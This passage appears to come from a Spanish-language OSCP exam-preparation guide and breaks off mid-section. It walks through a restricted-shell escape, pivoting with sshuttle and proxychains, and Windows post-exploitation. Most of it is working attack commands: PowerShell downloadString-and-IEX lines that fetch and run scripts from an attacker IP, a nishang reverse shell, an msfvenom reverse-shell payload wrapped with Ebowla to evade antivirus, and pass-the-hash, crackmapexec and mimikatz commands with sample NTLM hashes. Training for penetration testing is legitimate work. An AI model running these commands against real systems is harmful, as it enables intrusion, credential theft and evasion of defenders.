testuser@parrot:~$ echo '/bin/rm /home/testuser/.bashrc' | tee -a bin/ping
/bin/rm /home/testuser/.bashrc
testuser@parrot:~$ ls -a
.  ..  .bash_history  .bashrc  bin  .gnupg
testuser@parrot:~$ ping
/bin/rm: Â¿borrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s
testuser@parrot:~$ ls -a
.  ..  .bash_history  bin  .gnupg
testuser@parrot:~$ 
```

Una vez logra borrar el **.bashrc**, el siguiente objetivo es configurar una nueva variable de entorno **SHELL**, con la shell deseada, de la siguiente forma:

```bash
testuser@parrot:~$ echo 'export SHELL=bash' | tee '/home/testuser/.bashrc'
export SHELL=bash
testuser@parrot:~$ echo $SHELL
/bin/rbash
testuser@parrot:~$ exit
exit
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #su testuser
testuser@parrot:~$ echo $SHELL
bash
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ cd /
rbash: cd: restringido
testuser@parrot:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin
```

Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno **SHELL**, sin embargo, por alguna razÃ³n... sigue estando con las mismas restricciones. Llegados a este punto, lo Ãºnico que debe hacer es el tÃ­pico **shell spawning** aprovechando la utilidad de algÃºn otro binario, dado que su **PATH** ahora cuenta con todas las rutas absolutas de los binarios del sistema.

Para el siguiente caso, lo hacemos aprovechando la utilidad **-exec** del comando **find**:

```bash
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ find /etc/passwd -exec /bin/bash \;
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd ..
testuser@parrot:/home$ ls
s4vitar  testuser
testuser@parrot:/home$ export
declare -x COLORTERM="truecolor"
declare -x DISPLAY=":0.0"
declare -x HOME="/home/testuser"
declare -x LANG="es_ES.UTF-8"
declare -x LOGNAME="testuser"
declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
declare -x MAIL="/var/mail/testuser"
declare -x OLDPWD="/home/testuser"
declare -x PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin"
declare -x PWD="/home"
declare -x SHELL="bash"
declare -x SHLVL="3"
declare -x SUDO_COMMAND="/bin/su"
declare -x SUDO_GID="1000"
declare -x SUDO_UID="1000"
declare -x SUDO_USER="s4vitar"
declare -x TERM="xterm"
declare -x USER="testuser"
declare -x USERNAME="root"
declare -x XAUTHORITY="/home/s4vitar/.Xauthority"
testuser@parrot:/home$ 
```

#### Pivoting con Shuttle

Aunque en el examen no caerÃ¡n temas de Pivoting, nunca viene mal tener este concepto claro para saltar a otras redes (de cara a la mÃ¡quinas del laboratorio para saltar a los distintos segmentos).

Yo en verdad no suelo ser muy partidario de esta herramienta, lo que suelo hacer en su defecto es aplicar un '_Dynamic Port Forwarding_', de este modo sobre el sistema:

```bash
ssh -D 1080 usuario@host
```

Y dirÃ©is, ah... pero hay que conocer la password. Obviamente... si comprometes un equipo, serÃ¡ a fondo, lo mismo sucederÃ¡ con **Shuttle**.

Una vez hecha la conexiÃ³n, tendremos que aplicar la siguiente configuraciÃ³n desde el fichero '_/etc/proxychains.conf_':

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080
```

De esta forma, conseguimos que a la hora de aplicar la siguiente sintaxis sobre un Host al que no deberÃ­amos tener conectividad:

```bash
$~ proxychains ssh root@ipOtroSegmento
```

Tengamos alcance y nos resuelva el servicio. Para los escaneos con **nmap** sucede lo mismo, solo que hay que aÃ±adir una ligera variaciÃ³n en cuanto a parÃ¡metros respecta:

```bash
$~ proxychains nmap -p21,80,443 -r -v --open -T5 -v -Pn -T5 -n -oG openPorts
```

Tendremos que aÃ±adir los parÃ¡metros '-T5 -Pn' generalmente, lo mismo para escanear a fondo dichos puertos:

```bash
$~ proxychains nmap -p21,80,443 -Pn -T5 -sC -sV
```

Dicho esto, explico el uso de **Shuttle**. Supongamos que acabamos de comprometer el sistema **192.168.1.X**, tenemos las credenciales del usuario **pepe** para conexiÃ³n por SSH y descubrimos que desde dicho sistema tenemos conectividad con un nuevo segmento **10.2.15.0/24**. Una vez teniendo **shuttle** en nuestro sistema, lo Ãºnico que tendremos que hacer es lo siguiente:

```bash
sshuttle -vr pepe@192.168.1.X:22000 10.2.15.1/24 -x 192.168.1.X
```

Donde el parÃ¡metro '_-x_' es opcional, por el cual especificamos la propia IP del sistema para descartarla posteriormente del rango de conectividad. (Una tonterÃ­a, pero bueno)

# Port Knocking

Que no falte mencionar esta famosa practica para ocultar puertos. Para que sea entendible la utilidad sin entrar mucho a nivel tÃ©cnico, digamos que tenemos un VPS por el cual accedemos normalmente por el puerto 22 hacia el servicio SSH. Â¿QuÃ© sucede?, que el servicio queda pÃºblico de cara hacia fuera. Una prÃ¡ctica para proteger estos servicios es configurar una serie de puertos (generalmente 3), para de golpearlos hacer visible temporalmente estos servicios.

Me explico, supongamos que tras un escaneo inicial, vemos que el puerto 22 para el servicio SSH figura como '_closed_'. Sin embargo, por X razones, sabemos que de aplicar un **Port Knocking** sobre los puertos 4264 4563 5798, el puerto 22 se abre temporalmente permitiendo conexiones entrantes al servicio.

**Â¿CÃ³mo hacemos para golpear dichos puertos y realizar la conexiÃ³n?**

Los hay quienes se montan un script infumable, realmente no hace falta:

```bash
$~ nmap -p4264,4563,5798 -r -T5 -PN && ssh usuario@ip
```

Con hacer esto, se habilitarÃ­a temporalmente el servicio SSH sobre el puerto 22, visualizando la conexiÃ³n asociada asÃ­ como la autenticaciÃ³n para validar el usuario.

Como **nmap** a veces es muy suyo y no sigue el orden fijado de puertos a escanear, asignamos el parÃ¡metro '_-n_' para que el **Port Knocking** haga efecto, pues en caso de golpearlos en el orden incorrecto simplemente no sucederÃ¡ nada.

### Pentesting Windows

A pesar de implementar y poner en prÃ¡ctica otras tÃ©cnicas que no describo en los siguiente puntos, enumero a continuaciÃ³n las que para mi son mÃ¡s importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, asÃ­ como de cara al examen.

#### Transferencia de Archivos

Tenemos distintas formas de transferir archivos desde la mÃ¡quina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la mÃ¡quina Windows:

`certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe`

En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la mÃ¡quina Windows vÃ­a **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la mÃ¡quina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):

```bash
open 192.168.1.45 21
user s4vitar
password
binary
GET archivo
bye
```

Para ello, simplemente desde el _CMD_ vamos haciendo lo siguiente:

```bash
echo open 192.168.1.45 21 > ftp.txt
echo user s4vitar >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET archivo >> ftp.txt
echo bye >> ftp.txt
```

Para que se realicen los pasos fijados sobre el fichero, es necesario desde la mÃ¡quina Windows aplicar el siguiente comando:

```bash
ftp -v -n -s:ftp.txt
```

Una vez hecho, se realizarÃ¡ la transferencia y tendremos el recurso en la mÃ¡quina Windows. Lo mismo habrÃ­a valido para enviar archivos a nuestra mÃ¡quina local.

En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la mÃ¡quina Linux:

```bash
python -m pyftpdlib -p 21 -w
```

Posteriormente, ejecutamos las mismas instrucciones del lado de la mÃ¡quina comprometida.

Otra vÃ­a para realizar la transferencia de archivos desde nuestra mÃ¡quina de atacante a la mÃ¡quina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra mÃ¡quina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:

```bash
atftpd --daemon --port 69 /tftp
```

Una vez hecho, desde la mÃ¡quina Windows, aplicamos el siguiente comando:

```bash
tftp -i 192.168.1.45 GET nc.exe
```

Otra vÃ­a para realizar transferencia de archivos es desde nuestra mÃ¡quina de atacante, compartir los recursos a travÃ©s de un servidor web vÃ­a Python:

```bash
python -m SimpleHTTPServer 443
```

Y desde la mÃ¡quina Windows, aplicar los siguientes comandos de **Powershell**:

```powershell
powershell -c "(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\Users\user\Desktop\file.exe')"

# TambiÃ©n podemos usar esta otra forma
powershell Invoke-WebRequest "http://192.168.1.45:443/file.exe" -OutFile "C:\Users\user\Desktop\file.exe"
```

Por si todas estas vÃ­as de transferencia de archivos se nos quedan cortas, podemos hacerlo a travÃ©s de un script en **VBS**, que suele funcionar para la mayorÃ­a de las veces. Para ello, desde la mÃ¡quina Windows, tendremos que aplicar las siguientes instrucciones:

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vÃ­a Python en la mÃ¡quina atacante, descargar los recursos que consideremos:

```bash
cscript wget.vbs http://192.168.1.45:443/file.exe file.exe
```

Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionarÃ¡ igualmente:

```bash
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.vbs
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.vbs
echo WinHttpReq.Send(); >> wget.vbs
echo WScript.Echo(WinHttpReq.ResponseText); >> wget.vbs
echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.vbs
echo BinStream.Type = 1; >> wget.vbs
echo BinStream.Open(); >> wget.vbs
echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.vbs
echo BinStream.SaveToFile("out.bin"); >> wget.vbs
```

Una vez hecho, desde la propia mÃ¡quina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:

```bash
cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
```

En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque tambiÃ©n sirve para consola normal, sÃ³lo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.

Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado especÃ­fico para la comparticiÃ³n de archivos:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/smb]
â””â”€â”€â•¼ #impacket-smbserver shared `pwd`
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

A continuaciÃ³n, desde la mÃ¡quina Windows desde la sesiÃ³n Powershell, aplicamos el siguiente comando:

```bash
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\192.168.1.45\shared"
```

Directamente, veremos como se llevarÃ¡ a cabo una sincronizaciÃ³n de recursos, creando una unidad lÃ³gica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lÃ³gica *_pwd_*, la cual sincroniza contra la unidad fÃ­sica donde se sitÃºa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.

En primer lugar, cambiamos de unidad lÃ³gica en la mÃ¡quina Windows:

```bash
cd SharedFolder:
```

Posteriormente, nos traemos al equipo los recursos que consideremos:

```bash
move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
```

Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario _*accesschk_v5.02.exe*_:

```bash
$~ smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir
C:\DOCUME~1\ \\IP\parrotSmbFolder\accesschk_v5.02.exe -accepteula -uwqs "usuario" C:\*.*
```

Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.

#### AV Evasion Genetic Malware

A continuaciÃ³n, se detalla el procedimiento para crear **Malware GenÃ©tico**, ideal y de utilidad para la evasiÃ³n de antivirus asÃ­ como del propio Windows Defender.

Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), asÃ­ como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.

Cuando todo estÃ© preparado, una vez comprometida la mÃ¡quina Windows, suponiendo para un caso prÃ¡ctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual serÃ¡ ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecuciÃ³n del binario, lo primero serÃ¡ crear nuestro Malware desde **msfvenom**:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe
```

Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la mÃ¡quina Windows:

```bash
C:\Users\s4vitar\Desktop\ hostname
PC-S4vitar
```

Ya conociendo el **hostname**, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae **ebowla**. Abrimos en primer lugar el archivo _genetic.config_, cambiando las variables **output_type** y **payload_type** por las siguientes:

```bash
output_type = GO
payload_type = EXE
```

Una vez hecho, bajamos hasta la secciÃ³n de variables de entorno:

```bash
    [[ENV_VAR]]

        username = ''
        computername = ''
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

En este caso, dado que a modo de ejemplo vamos a jugar Ãºnicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:


```bash
    [[ENV_VAR]]

        username = ''
        computername = 'PC-S4vitar'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a travÃ©s de las propias variables de entorno. Esto quiere decir, que tras la ejecuciÃ³n del binario en la mÃ¡quina comprometida, este se encargarÃ¡ de descifrar todo el ejecutable a travÃ©s de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecuciÃ³n del binario no serÃ¡ funcional.

Una vez hecho, aplicamos el siguiente comando desde consola:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
â””â”€â”€â•¼ #python ebowla.py shell.exe genetic.config 
[*] Using Symmetric encryption
[*] Payload length 73802
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
	[-] environment value used: computername, value used: pc-s4vitar
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: pc-s4vitar
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9
[*] Writing GO payload to: go_symmetric_shell.exe.go
```

Este paso, lo que harÃ¡ serÃ¡ crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
â””â”€â”€â•¼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy finalshell.exe to output
[*] Cleaning up
[*] Done

```

Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la mÃ¡quina Windows.

Es importante que la ruta del binario **go** estÃ© configurada en el _PATH_, pues en caso contrario no lo encontrarÃ¡. Si queremos que funcione de manera temporal para la ejecuciÃ³n del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:

```bash
export PATH=/usr/local/go/bin:$PATH
```

Obviamente, cuantas mÃ¡s variables de entorno utilicemos mejor serÃ¡ nuestro _AV Evasion_.

#### Windows Port Forwarding

Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseÃ±a que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexiÃ³n desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.

Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario **plink.exe** para llevar a cabo el procedimiento.

Lo Ãºnico que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.

Cuando todo estÃ© configurado correctamente, desde la mÃ¡quina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra mÃ¡quina local:

```bash
plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciÃ³nIP
```

AutomÃ¡ticamente, se entablarÃ¡ la conexiÃ³n hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra mÃ¡quina.

Ahora la idea es llevar a cabo la autenticaciÃ³n desde nuestra mÃ¡quina al propio servicio local, el cual enruta al servicio samba de la mÃ¡quina Windows. Suponiendo que la contraseÃ±a del usuario administrador es '**test123**', aplicamos el siguiente comando en local:

```bash
/usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe
```

Una vez aplicado el comando, veremos cÃ³mo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).

Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la mÃ¡quina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.

Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:

```bash
cme smb ip --gen-relay-list ip
```

#### Hashdump Manual

Desde Metasploit, uno estÃ¡ acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, asÃ­ como el auxiliar. A continuaciÃ³n se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.

Es tan sencillo como traerse con privilegios de administrador, los recursos **SAM** y **System** del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:

```bash
pwdump system SAM
```

Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer **PassTheHash**.

#### PassTheHash

A la hora de contar con un Hash NTLM vÃ¡lido de usuario, por ejemplo para este caso prÃ¡ctico, de Administrador, podemos llevar a cabo una autenticaciÃ³n contra el sistema a fin de conseguir una Shell interactiva a travÃ©s del servicio Samba.

Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permite hacer conexiones como la siguiente:

```bash
pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe
```

Como es de obviar, este paso nos ahorra el tener que crackear la contraseÃ±a. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:

```bash
crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 
```

Obteniendo un **pwned** en caso de lograr la autenticaciÃ³n para algunos de los Hosts probados. A su vez, su uso puede ser Ãºtil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:

```bash
crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz
```

TambiÃ©n habrÃ­a servido contra todo el rango /24. Su uso tambiÃ©n puede ser utilizado incluso para en caso de no conocer la contraseÃ±a en claro, realizar autenticaciones vÃ­a **RDP**:

```bash
xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
```

#### Enumeration and Privilege Escalation

Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeraciÃ³n que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.

Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rÃ¡pida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseÃ±as en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el mÃ³dulo y luego lo ejecutan... yo lo suelo hacer todo de una.

Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/opt/PowerSploit/Privesc]
â””â”€â”€â•¼ #cat PowerUp.ps1 | grep AllChecks  | grep "function" | tr -d '{'
function Invoke-AllChecks 

```

Para poder ejecutarla de un solo tirÃ³n, aÃ±adimos una llamada a dicha funciÃ³n al final de nuestro script:

```bash
# Ãšltimas lÃ­neas del script

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']

Invoke-AllChecks
```

Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')
```

Esperamos unos segundos, y obtendremos directamente los resultados de la ejecuciÃ³n del script.

En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeraciÃ³n, donde se nos listarÃ¡n en base al anÃ¡lisis efectuado un puÃ±ado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sÃ³lo que en este caso, la funciÃ³n a aÃ±adir en la Ãºltima lÃ­nea serÃ­a **Find-AllVulns**.

#### PowerShell Reverse Shell

Para los amantes de PowerShell que no viven sin su sesiÃ³n PS, por aquÃ­ os explico una tÃ©cnica para conseguir acceso al sistema con sesiÃ³n PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.

AÃ±adimos al final del script la siguiente lÃ­nea:

`Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443`

Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por **Netcat** en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')
```

En cuestiÃ³n de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vÃ­a **PowerShell**.

#### Manual Migration Process

Aunque las mÃ¡quinas Windows del examen suelen ser de 32 bits, como mÃ¡s vale prevenir que curar detallo una tÃ©cnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeraciÃ³n del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la mÃ¡quina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darÃ¡n montÃ³n de falsos positivos.

El saber con quÃ© aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a travÃ©s de las siguientes consultas:

`[Environment]::Is64BitOperatingSystem`

`[Environment]::Is64BitProcess`

Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo Ãºnico que tendremos que hacer es por ejemplo ganando sesiÃ³n por Powershell invocar al mismo desde la siguiente ruta:

```bash
C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')
```

Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en quÃ© proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverÃ¡ un **True**, pudiendo ya proseguir con la enumeraciÃ³n a nivel de sistema.

#### RCE Filter Evasion Microsoft SQL

El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vÃ­a **sqsh** o a travÃ©s del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.

En caso de contar con credenciales vÃ¡lidas, podemos realizar la autenticaciÃ³n al servicio via **sqsh** de la siguiente forma:

```bash
sqsh -S 192.168.1.X -U sa -P superPassword
```

En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parÃ¡metro **-P**.

Una vez conectados, podemos realizar las siguientes instrucciones:

```bash
